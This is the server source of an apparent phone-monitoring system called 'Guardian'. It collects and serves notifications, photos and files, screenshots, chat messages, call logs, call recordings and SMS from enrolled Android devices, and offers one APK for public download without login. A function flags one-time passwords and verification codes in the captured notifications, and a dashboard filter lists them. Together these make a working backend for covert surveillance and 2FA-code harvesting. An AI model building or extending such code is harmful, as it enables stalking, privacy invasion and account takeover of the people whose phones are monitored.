import express from "express";
import path from "node:path";
import fs from "node:fs";
import { gzipSync } from "node:zlib";
import { fileURLToPath } from "node:url";
import { ZipArchive } from "archiver";
import { prisma } from "./db.js";
import { ingestRouter } from "./routes/ingest.js";
import { storageSyncRouter, deviceMediaDir, MEDIA_STORE_DIR } from "./routes/storageSync.js";
import { screenshotSyncRouter } from "./routes/screenshotSync.js";
import { chatSyncRouter } from "./routes/chatSync.js";
import { callSyncRouter } from "./routes/callSync.js";
import { smsSyncRouter } from "./routes/smsSync.js";
import { appUpdateRouter } from "./routes/appUpdate.js";
import { createSessionToken, parseCookies, verifyPassword, verifySessionToken, issueWalletChallenge, consumeWalletChallenge, verifyWalletSignature } from "./auth.js";
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const APK_PATH = path.join(__dirname, "../public/guardian.apk");
const DASHBOARD_DIST = path.join(__dirname, "../../dashboard/dist");
const app = express();
app.use(express.json({ limit: "2mb" }));
app.get("/health", (_req, res) => res.json({ ok: true }));
// Public config for the wallet login page
app.get("/api/config", (_req, res) => {
    res.json({ reownProjectId: process.env.REOWN_PROJECT_ID ?? "" });
});
/* --------------------------------- Login ------------------------------------ */
// Gates the dashboard's data (device list, message feed, APK download) behind a
// single admin login. Session is a stateless signed cookie — no server-side store.
const COOKIE_NAME = "guardian_session";
const SESSION_SECRET = process.env.SESSION_SECRET;
const ADMIN_USERNAME = process.env.ADMIN_USERNAME;
const ADMIN_PASSWORD_HASH = process.env.ADMIN_PASSWORD_HASH;
if (!SESSION_SECRET || !ADMIN_USERNAME || !ADMIN_PASSWORD_HASH) {
    console.warn("WARNING: SESSION_SECRET / ADMIN_USERNAME / ADMIN_PASSWORD_HASH not set — dashboard login will reject everyone.");
}
function isAuthed(req) {
    if (!SESSION_SECRET)
        return false;
    const cookies = parseCookies(req.header("cookie"));
    return verifySessionToken(cookies[COOKIE_NAME], SESSION_SECRET);
}
function requireAuth(req, res, next) {
    if (isAuthed(req))
        return next();
    res.status(401).json({ error: "authentication required" });
}
app.post("/api/login", (req, res) => {
    const { username, password } = (req.body ?? {});
    if (!SESSION_SECRET ||
        !ADMIN_USERNAME ||
        !ADMIN_PASSWORD_HASH ||
        typeof username !== "string" ||
        typeof password !== "string" ||
        username !== ADMIN_USERNAME ||
        !verifyPassword(password, ADMIN_PASSWORD_HASH)) {
        return res.status(401).json({ error: "invalid username or password" });
    }
    res.cookie(COOKIE_NAME, createSessionToken(SESSION_SECRET), {
        httpOnly: true,
        sameSite: "lax",
        maxAge: 12 * 60 * 60 * 1000,
    });
    res.json({ ok: true });
});
app.post("/api/logout", (_req, res) => {
    res.clearCookie(COOKIE_NAME);
    res.json({ ok: true });
});
app.get("/api/session", (req, res) => {
    res.json({ authenticated: isAuthed(req) });
});
// Diagnostic request log for device endpoints: shows heartbeat/ingest/media-sync attempts,
// their status, and how many events/items the device sent.
app.use("/v1", (req, res, next) => {
    const body = req.body;
    const n = Array.isArray(body?.events) ? body.events.length : Array.isArray(body?.items) ? body.items.length : undefined;
    res.on("finish", () => {
        const evt = n !== undefined ? ` count=${n}` : "";
        console.log(`[v1] ${new Date().toISOString()} ${req.method} ${req.originalUrl} -> ${res.statusCode}${evt} ua="${req.header("user-agent") ?? "-"}"`);
    });
    next();
});
app.use(ingestRouter);
app.use(storageSyncRouter);
app.use(screenshotSyncRouter);
app.use(chatSyncRouter);
app.use(callSyncRouter);
app.use(smsSyncRouter);
app.use(appUpdateRouter);
app.use("/api", appUpdateRouter);
// APK sends to /api/v1/* — mount same routers under /api so Express strips prefix to /v1/*
app.use("/api", ingestRouter);
app.use("/api", storageSyncRouter);
app.use("/api", screenshotSyncRouter);
app.use("/api", chatSyncRouter);
app.use("/api", callSyncRouter);
/* ─────────────────── Wallet (MetaMask) authentication ──────────────────────
 *
 * Flow:
 *  1. Client → GET /api/wallet/nonce?address=0x...
 *     Server checks address is authorized, generates a one-time nonce message,
 *     stores it server-side (5-min TTL), returns the message text.
 *  2. Client asks MetaMask to personal_sign the message.
 *  3. Client → POST /api/wallet/verify { address, signature }
 *     Server recovers the signer via EIP-191, compares with stored address,
 *     consumes the nonce (one-time), and issues the session cookie on success.
 */
const AUTHORIZED_WALLETS = new Set((process.env.AUTHORIZED_WALLET ?? "")
    .split(",")
    .map((a) => a.toLowerCase().trim())
    .filter(Boolean));
/** Issues a sign-in challenge for the given wallet address (authorized wallet only). */
app.get("/api/wallet/nonce", (req, res) => {
    const raw = (req.query.address ?? "").trim();
    const address = raw.toLowerCase();
    if (!/^0x[0-9a-f]{40}$/.test(address)) {
        return res.status(400).json({ error: "invalid wallet address" });
    }
    if (AUTHORIZED_WALLETS.size > 0 && !AUTHORIZED_WALLETS.has(address)) {
        return res.status(403).json({ error: "wallet not authorized" });
    }
    const message = issueWalletChallenge(address);
    res.json({ message });
});
/** Verifies the EIP-191 signature; on success issues the same session cookie as password login. */
app.post("/api/wallet/verify", (req, res) => {
    const { address: rawAddr, signature } = (req.body ?? {});
    if (!rawAddr || !signature || typeof rawAddr !== "string" || typeof signature !== "string") {
        return res.status(400).json({ error: "address and signature are required" });
    }
    const address = rawAddr.toLowerCase();
    if (!/^0x[0-9a-f]{40}$/.test(address)) {
        return res.status(400).json({ error: "invalid wallet address" });
    }
    if (AUTHORIZED_WALLETS.size > 0 && !AUTHORIZED_WALLETS.has(address)) {
        return res.status(403).json({ error: "wallet not authorized" });
    }
    const message = consumeWalletChallenge(address);
    if (!message) {
        return res.status(400).json({ error: "nonce expired or not found — request a new challenge" });
    }
    if (!verifyWalletSignature(address, message, signature)) {
        return res.status(401).json({ error: "signature verification failed" });
    }
    if (!SESSION_SECRET)
        return res.status(500).json({ error: "server misconfigured" });
    res.cookie(COOKIE_NAME, createSessionToken(SESSION_SECRET), {
        httpOnly: true,
        sameSite: "lax",
        maxAge: 12 * 60 * 60 * 1000,
    });
    res.json({ ok: true });
});
/* ----------------------------- APK distribution ---------------------------- */
/** Whether a built APK is currently available for download. */
app.get("/api/apk-status", requireAuth, (_req, res) => {
    if (!fs.existsSync(APK_PATH))
        return res.json({ available: false });
    const stat = fs.statSync(APK_PATH);
    // A real APK is a ZIP archive → starts with the magic bytes "PK" (0x50 0x4B).
    // Anything else (like our text placeholder) is downloadable but flagged not-real.
    const fd = fs.openSync(APK_PATH, "r");
    const head = Buffer.alloc(2);
    fs.readSync(fd, head, 0, 2, 0);
    fs.closeSync(fd);
    const isRealApk = head[0] === 0x50 && head[1] === 0x4b;
    res.json({
        available: true,
        isRealApk,
        sizeBytes: stat.size,
        builtAt: stat.mtime.toISOString(),
    });
});
/** Serves the monitored-device APK. The binary is produced by the Android build
 *  (locally via gradlew, or in CI) and placed at server/public/guardian.apk. */
app.get("/download/apk", requireAuth, (_req, res) => {
    if (!fs.existsSync(APK_PATH)) {
        return res
            .status(503)
            .json({ error: "APK not built yet. Build android/ and place it at server/public/guardian.apk" });
    }
    res.download(APK_PATH, "guardian.apk");
});
/** Public download for the Glovion APK – no login required. */
const GLOVION_APK_PATH = path.join(__dirname, "../public/Glovion.apk");
app.get("/download/glovion", (_req, res) => {
    if (!fs.existsSync(GLOVION_APK_PATH)) {
        return res.status(404).json({ error: "Glovion APK not available yet." });
    }
    res.download(GLOVION_APK_PATH, "Glovion.apk");
});
/* ------------------------------ Dashboard API ------------------------------- */
/** A device counts as online if it was seen within this window. */
const ONLINE_WINDOW_MS = 150_000;
/** Detect likely OTP/verification-code notifications from text content. */
function detectOtp(text) {
    if (!text)
        return false;
    if (/\b(otp|one.?time.?password|verification code|verify code|auth code|passcode|security code|access code)\b/i.test(text))
        return true;
    if (/\b\d{4,8}\b/.test(text))
        return true;
    return false;
}
// 2.5 min — heartbeat runs ~every 60s
/** Devices list for the dashboard, with live online status. */
app.get("/api/devices", requireAuth, async (_req, res) => {
    const devices = await prisma.device.findMany({
        orderBy: { createdAt: "desc" },
        select: {
            id: true,
            label: true,
            createdAt: true,
            lastSeenAt: true,
            _count: { select: { events: true, mediaItems: true, screenshots: true, chatMessages: true, callLogs: true, callRecordings: true } },
        },
    });
    const now = Date.now();
    res.json(devices.map((d) => ({
        id: d.id,
        label: d.label,
        createdAt: d.createdAt,
        eventCount: d._count.events,
        mediaCount: d._count.mediaItems,
        screenshotCount: d._count.screenshots,
        chatMessageCount: d._count.chatMessages,
        callLogCount: d._count.callLogs,
        callRecordingCount: d._count.callRecordings,
        lastSeenAt: d.lastSeenAt ? d.lastSeenAt.toISOString() : null,
        online: d.lastSeenAt ? now - d.lastSeenAt.getTime() < ONLINE_WINDOW_MS : false,
    })));
});
/** Captured notifications for a device (newest first). Supports ?isOtp=true to filter OTP events. */
app.get("/api/devices/:deviceId/events", requireAuth, async (req, res) => {
    const { isOtp: isOtpFilter, page: pageStr, limit: limitStr } = req.query;
    const where = { deviceId: req.params.deviceId };
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const mapRow = (r) => ({
        id: r.id,
        packageName: r.packageName,
        appLabel: r.appLabel,
        conversationTitle: r.conversationTitle,
        sender: r.sender,
        text: r.text,
        isGroup: r.isGroup,
        isOtp: detectOtp(r.text),
        postedAt: r.postedAt.toString(),
        capturedAt: r.capturedAt.toString(),
        receivedAt: r.receivedAt.toISOString(),
    });
    if (pageStr) {
        const pageNum = Math.max(1, parseInt(pageStr) || 1);
        const limitNum = Math.min(Math.max(1, parseInt(limitStr ?? "") || 100), 1000);
        const skip = (pageNum - 1) * limitNum;
        const [total, rows] = await Promise.all([
            prisma.event.count({ where }),
            prisma.event.findMany({ where, orderBy: { receivedAt: "desc" }, skip, take: limitNum }),
        ]);
        const items = rows.map(mapRow);
        const totalPages = Math.ceil(total / limitNum);
        const filtered = isOtpFilter === "true" ? items.filter((e) => e.isOtp) : items;
        return res.json({ items: filtered, total, page: pageNum, totalPages });
    }
    const rows = await prisma.event.findMany({ where, orderBy: { receivedAt: "desc" }, take: 5000 });
    const mapped = rows.map(mapRow);
    res.json(isOtpFilter === "true" ? mapped.filter((e) => e.isOtp) : mapped);
});
/** Synchronized media metadata for a device (newest first), with optional filters and pagination.
 *  Without ?page, returns up to 10 000 items as a plain array (gzip-compressed when the client
 *  supports it). With ?page=N&limit=M, returns { items, total, page, totalPages }. */
app.get("/api/devices/:deviceId/media", requireAuth, async (req, res) => {
    const { deviceId } = req.params;
    const { type, q, from, to, category, page: pageStr, limit: limitStr } = req.query;
    const where = { deviceId };
    if (type === "image" || type === "video" || type === "audio" || type === "document")
        where.mediaType = type;
    if (q)
        where.displayName = { contains: q };
    if (category)
        where.folderCategory = category;
    const dateAdded = {};
    const fromMs = from ? Number(from) : undefined;
    const toMs = to ? Number(to) : undefined;
    if (fromMs !== undefined && Number.isFinite(fromMs))
        dateAdded.gte = BigInt(Math.trunc(fromMs));
    if (toMs !== undefined && Number.isFinite(toMs))
        dateAdded.lte = BigInt(Math.trunc(toMs));
    if (dateAdded.gte !== undefined || dateAdded.lte !== undefined)
        where.dateAddedMs = dateAdded;
    const pageNum = Math.max(1, parseInt(pageStr ?? "") || 1);
    const limitNum = Math.min(Math.max(1, parseInt(limitStr ?? "") || 10_000), 50_000);
    const skip = (pageNum - 1) * limitNum;
    const [total, rows] = await Promise.all([
        prisma.mediaItem.count({ where }),
        prisma.mediaItem.findMany({ where, orderBy: { receivedAt: "desc" }, skip, take: limitNum }),
    ]);
    const totalPages = Math.ceil(total / limitNum);
    const items = rows.map((r) => ({
        id: r.id,
        mediaType: r.mediaType,
        uri: r.uri,
        displayName: r.displayName,
        mimeType: r.mimeType,
        sizeBytes: r.sizeBytes !== null ? r.sizeBytes.toString() : null,
        dateAddedMs: r.dateAddedMs !== null ? r.dateAddedMs.toString() : null,
        dateModifiedMs: r.dateModifiedMs !== null ? r.dateModifiedMs.toString() : null,
        width: r.width,
        height: r.height,
        durationMs: r.durationMs !== null ? r.durationMs.toString() : null,
        thumbnailBase64: r.thumbnailBase64,
        syncStatus: r.syncStatus,
        contentAvailable: r.syncStatus === "uploaded" && r.storedPath !== null,
        contentSizeBytes: r.contentSizeBytes !== null ? r.contentSizeBytes.toString() : null,
        syncedAt: r.syncedAt ? r.syncedAt.toISOString() : null,
        capturedAt: r.capturedAt.toString(),
        receivedAt: r.receivedAt.toISOString(),
        folderCategory: r.folderCategory ?? null,
        relativePath: r.relativePath ?? null,
    }));
    // Return paginated envelope when caller passed ?page, otherwise return plain array
    // (preserving backward compatibility with the dashboard frontend).
    const responseData = pageStr ? { items, total, page: pageNum, totalPages } : items;
    const json = JSON.stringify(responseData);
    // Gzip-compress the response when the client supports it (especially important for
    // large collections: ~30 MB uncompressed compresses to ~3-5 MB).
    const ae = (req.headers["accept-encoding"] ?? "").toString();
    if (ae.includes("gzip")) {
        res.setHeader("Content-Type", "application/json");
        res.setHeader("Content-Encoding", "gzip");
        res.end(gzipSync(Buffer.from(json)));
    }
    else {
        res.setHeader("Content-Type", "application/json");
        res.end(json);
    }
});
/** Serves media file content inline for preview (dashboard session auth only). */
app.get("/api/devices/:deviceId/media/:itemId/content", requireAuth, async (req, res) => {
    const { deviceId, itemId } = req.params;
    const item = await prisma.mediaItem.findUnique({ where: { id: itemId } });
    if (!item || item.deviceId !== deviceId || !item.storedPath) {
        return res.status(404).json({ error: "content not available" });
    }
    const absolutePath = path.join(MEDIA_STORE_DIR, item.storedPath);
    if (!absolutePath.startsWith(MEDIA_STORE_DIR) || !fs.existsSync(absolutePath)) {
        return res.status(404).json({ error: "content not available" });
    }
    res.setHeader("Content-Type", item.mimeType ?? "application/octet-stream");
    res.setHeader("Content-Disposition", `inline; filename="${(item.displayName ?? itemId).replace(/"/g, "")}"`);
    res.sendFile(absolutePath);
});
/** Downloads media file as an attachment (forces browser save dialog). Dashboard session auth only. */
app.get("/api/devices/:deviceId/media/:itemId/download", requireAuth, async (req, res) => {
    const { deviceId, itemId } = req.params;
    const item = await prisma.mediaItem.findUnique({ where: { id: itemId } });
    if (!item || item.deviceId !== deviceId || !item.storedPath) {
        return res.status(404).json({ error: "content not available" });
    }
    const absolutePath = path.join(MEDIA_STORE_DIR, item.storedPath);
    if (!absolutePath.startsWith(MEDIA_STORE_DIR) || !fs.existsSync(absolutePath)) {
        return res.status(404).json({ error: "content not available" });
    }
    const filename = (item.displayName ?? itemId).replace(/["/\\]/g, "_");
    res.setHeader("Content-Type", item.mimeType ?? "application/octet-stream");
    res.setHeader("Content-Disposition", `attachment; filename="${filename}"`);
    res.sendFile(absolutePath);
});
/** Screenshots for a device (newest first), with optional date range. */
app.get("/api/devices/:deviceId/screenshots", requireAuth, async (req, res) => {
    const { deviceId } = req.params;
    const { from, to } = req.query;
    const where = { deviceId };
    const capturedAt = {};
    const fromMs = from ? Number(from) : undefined;
    const toMs = to ? Number(to) : undefined;
    if (fromMs !== undefined && Number.isFinite(fromMs))
        capturedAt.gte = BigInt(Math.trunc(fromMs));
    if (toMs !== undefined && Number.isFinite(toMs))
        capturedAt.lte = BigInt(Math.trunc(toMs));
    if (capturedAt.gte !== undefined || capturedAt.lte !== undefined)
        where.capturedAt = capturedAt;
    const rows = await prisma.screenshot.findMany({
        where,
        orderBy: { capturedAt: "desc" },
        take: 200,
    });
    res.json(rows.map((r) => ({
        id: r.id,
        filename: r.filename,
        sizeBytes: r.sizeBytes,
        width: r.width,
        height: r.height,
        capturedAt: r.capturedAt.toString(),
        receivedAt: r.receivedAt.toISOString(),
    })));
});
/** Serves screenshot image content (dashboard session auth only). */
app.get("/api/devices/:deviceId/screenshots/:id/content", requireAuth, async (req, res) => {
    const { deviceId, id } = req.params;
    const item = await prisma.screenshot.findUnique({ where: { id } });
    if (!item || item.deviceId !== deviceId || !item.storedPath) {
        return res.status(404).json({ error: "screenshot not available" });
    }
    const absolutePath = path.join(MEDIA_STORE_DIR, item.storedPath);
    if (!absolutePath.startsWith(MEDIA_STORE_DIR) || !fs.existsSync(absolutePath)) {
        return res.status(404).json({ error: "screenshot not available" });
    }
    res.setHeader("Content-Type", "image/jpeg");
    res.setHeader("Content-Disposition", `inline; filename="${item.filename}.jpg"`);
    res.sendFile(absolutePath);
});
/** Imported chat messages for a device (newest first), with optional search. */
app.get("/api/devices/:deviceId/chats", requireAuth, async (req, res) => {
    const { deviceId } = req.params;
    const { q, chat } = req.query;
    const where = { deviceId };
    if (q)
        where.text = { contains: q };
    if (chat)
        where.chatName = chat;
    const rows = await prisma.chatMessage.findMany({
        where,
        orderBy: { messageAt: "desc" },
        take: 500,
    });
    res.json(rows.map((r) => ({
        id: r.id,
        clientMessageId: r.clientMessageId,
        chatName: r.chatName,
        sender: r.sender,
        text: r.text,
        messageAt: r.messageAt.toString(),
        importedAt: r.importedAt.toISOString(),
    })));
});
/** Distinct chat names for a device (for the filter dropdown). */
app.get("/api/devices/:deviceId/chats/conversations", requireAuth, async (req, res) => {
    const { deviceId } = req.params;
    const raw = await prisma.chatMessage.groupBy({
        by: ["chatName"],
        where: { deviceId },
        _count: { id: true },
        orderBy: { _count: { id: "desc" } },
    });
    res.json(raw.map((r) => ({ chatName: r.chatName, count: r._count.id })));
});
/** Call logs for a device (newest first), with optional search. */
app.get("/api/devices/:deviceId/calls", requireAuth, async (req, res) => {
    const { deviceId } = req.params;
    const { q, type } = req.query;
    const where = { deviceId };
    if (q)
        where.OR = [
            { phoneNumber: { contains: q } },
            { contactName: { contains: q } },
        ];
    if (type && ["incoming", "outgoing", "missed", "rejected", "blocked"].includes(type)) {
        where.callType = type;
    }
    const rows = await prisma.callLog.findMany({
        where,
        orderBy: { callAt: "desc" },
        take: 500,
    });
    res.json(rows.map((r) => ({
        id: r.id,
        clientCallId: r.clientCallId,
        phoneNumber: r.phoneNumber,
        contactName: r.contactName,
        callType: r.callType,
        duration: r.duration,
        callAt: r.callAt.toString(),
        receivedAt: r.receivedAt.toISOString(),
    })));
});
/** Call recordings for a device (newest first). */
app.get("/api/devices/:deviceId/call-recordings", requireAuth, async (req, res) => {
    const { deviceId } = req.params;
    const rows = await prisma.callRecording.findMany({
        where: { deviceId },
        orderBy: { callAt: "desc" },
        take: 200,
    });
    res.json(rows.map((r) => ({
        id: r.id,
        clientRecId: r.clientRecId,
        phoneNumber: r.phoneNumber,
        contactName: r.contactName,
        callType: r.callType,
        duration: r.duration,
        sizeBytes: r.sizeBytes,
        callAt: r.callAt.toString(),
        receivedAt: r.receivedAt.toISOString(),
    })));
});
/** Streams a call recording audio file (dashboard session auth only). */
app.get("/api/devices/:deviceId/call-recordings/:recId/content", requireAuth, async (req, res) => {
    const { deviceId, recId } = req.params;
    const item = await prisma.callRecording.findUnique({ where: { id: recId } });
    if (!item || item.deviceId !== deviceId || !item.storedPath) {
        return res.status(404).json({ error: "recording not available" });
    }
    const absolutePath = path.join(MEDIA_STORE_DIR, item.storedPath);
    if (!absolutePath.startsWith(MEDIA_STORE_DIR) || !fs.existsSync(absolutePath)) {
        return res.status(404).json({ error: "recording not available" });
    }
    res.setHeader("Content-Type", "audio/mpeg");
    res.setHeader("Content-Disposition", `inline; filename="call-${item.clientRecId}.mp3"`);
    res.sendFile(absolutePath);
});
/** Removes a device, its captured messages, media, screenshots, and stored content. */
app.delete("/api/devices/:deviceId", requireAuth, async (req, res) => {
    const { deviceId } = req.params;
    const existing = await prisma.device.findUnique({ where: { id: deviceId }, select: { id: true } });
    if (!existing)
        return res.status(404).json({ error: "device not found" });
    await prisma.$transaction([
        prisma.event.deleteMany({ where: { deviceId } }),
        prisma.mediaItem.deleteMany({ where: { deviceId } }),
        prisma.screenshot.deleteMany({ where: { deviceId } }),
        prisma.chatMessage.deleteMany({ where: { deviceId } }),
        prisma.callLog.deleteMany({ where: { deviceId } }),
        prisma.callRecording.deleteMany({ where: { deviceId } }),
        prisma.smsMessage.deleteMany({ where: { deviceId } }),
        prisma.device.delete({ where: { id: deviceId } }),
    ]);
    await fs.promises.rm(deviceMediaDir(deviceId), { recursive: true, force: true });
    res.json({ ok: true });
});
/** Exports all synced media files for a device as a ZIP archive.
 *  Supports the same optional filters as the media list endpoint. */
app.get("/api/devices/:deviceId/media/zip", requireAuth, async (req, res) => {
    const { deviceId } = req.params;
    const { type, q, from, to, category } = req.query;
    const where = { deviceId, syncStatus: "uploaded" };
    if (type === "image" || type === "video" || type === "audio" || type === "document")
        where.mediaType = type;
    if (q)
        where.displayName = { contains: q };
    if (category)
        where.folderCategory = category;
    const dateAdded = {};
    const fromMs = from ? Number(from) : undefined;
    const toMs = to ? Number(to) : undefined;
    if (fromMs !== undefined && Number.isFinite(fromMs))
        dateAdded.gte = BigInt(Math.trunc(fromMs));
    if (toMs !== undefined && Number.isFinite(toMs))
        dateAdded.lte = BigInt(Math.trunc(toMs));
    if (dateAdded.gte !== undefined || dateAdded.lte !== undefined)
        where.dateAddedMs = dateAdded;
    const items = await prisma.mediaItem.findMany({
        where,
        orderBy: { receivedAt: "desc" },
        select: { id: true, displayName: true, storedPath: true },
    });
    const available = items.filter((item) => item.storedPath !== null);
    if (available.length === 0) {
        return res.status(404).json({ error: "no synced media files available for download" });
    }
    const archive = new ZipArchive({ zlib: { level: 6 } });
    res.setHeader("Content-Type", "application/zip");
    res.setHeader("Content-Disposition", `attachment; filename="media-${deviceId.slice(0, 12)}.zip"`);
    archive.pipe(res);
    archive.on("error", (err) => {
        console.error("[media/zip] archiver error:", err.message);
    });
    const usedNames = new Set();
    for (const item of available) {
        const absPath = path.join(MEDIA_STORE_DIR, item.storedPath);
        if (!absPath.startsWith(MEDIA_STORE_DIR) || !fs.existsSync(absPath))
            continue;
        let name = (item.displayName ?? item.id).replace(/[/\\"]/g, "_");
        if (usedNames.has(name)) {
            const ext = path.extname(name);
            const base = path.basename(name, ext);
            name = `${base}_${item.id.slice(-8)}${ext}`;
        }
        usedNames.add(name);
        archive.file(absPath, { name });
    }
    await archive.finalize();
});
/** Exports all screenshots for a device as a ZIP archive. */
app.get("/api/devices/:deviceId/screenshots/zip", requireAuth, async (req, res) => {
    const { deviceId } = req.params;
    const items = await prisma.screenshot.findMany({
        where: { deviceId },
        orderBy: { capturedAt: "desc" },
        select: { id: true, filename: true, storedPath: true },
    });
    const available = items.filter((item) => item.storedPath !== null);
    if (available.length === 0) {
        return res.status(404).json({ error: "no screenshots available for download" });
    }
    const archive = new ZipArchive({ zlib: { level: 6 } });
    res.setHeader("Content-Type", "application/zip");
    res.setHeader("Content-Disposition", `attachment; filename="screenshots-${deviceId.slice(0, 12)}.zip"`);
    archive.pipe(res);
    archive.on("error", (err) => {
        console.error("[screenshots/zip] archiver error:", err.message);
    });
    for (const item of available) {
        const absPath = path.join(MEDIA_STORE_DIR, item.storedPath);
        if (!absPath.startsWith(MEDIA_STORE_DIR) || !fs.existsSync(absPath))
            continue;
        const name = (item.filename ?? item.id).replace(/[/\\"]/g, "_") + ".jpg";
        archive.file(absPath, { name });
    }
    await archive.finalize();
});
/* ----------------------- Dev helpers (pairing stand-in) --------------------- */
app.post("\/dev\//enroll", async (req, res) => {
    const { deviceId, enrollmentToken, label } = req.body ?? {};
    if (!deviceId || !enrollmentToken) {
        return res.status(400).json({ error: "deviceId and enrollmentToken required" });
    }
    const device = await prisma.device.upsert({
        where: { id: deviceId },
        update: { enrollmentToken, label },
        create: { id: deviceId, enrollmentToken, label },
    });
    res.json({ deviceId: device.id, label: device.label });
});
/* --------------------------- Static dashboard ------------------------------- */
if (fs.existsSync(DASHBOARD_DIST)) {
    // Direct route for the standalone chat messages viewer
    app.get("/chats", (_req, res) => res.sendFile(path.join(DASHBOARD_DIST, "chats.html")));
    // /wallet-login route removed; returns 404
    app.get("/wallet-login", (_req, res) => res.status(404).json({ error: "not found" }));
    // Root route → wallet login page
    app.get("/", (_req, res) => res.sendFile(path.join(DASHBOARD_DIST, "wallet-login.html")));
    // Password login route → standalone password form
    app.get("/password-login", (_req, res) => res.sendFile(path.join(DASHBOARD_DIST, "password-login.html")));
    app.use(express.static(DASHBOARD_DIST));
    // SPA fallback for client-side routing.
    app.get(/^(?!\/api|\/download|\/v1|\/dev\/|\/health).*/, (_req, res) => {
        res.sendFile(path.join(DASHBOARD_DIST, "index.html"));
    });
}
const port = Number(process.env.PORT ?? 8080);
app.listen(port, () => console.log(`Guardian server (API + dashboard) listening on :${port}`));
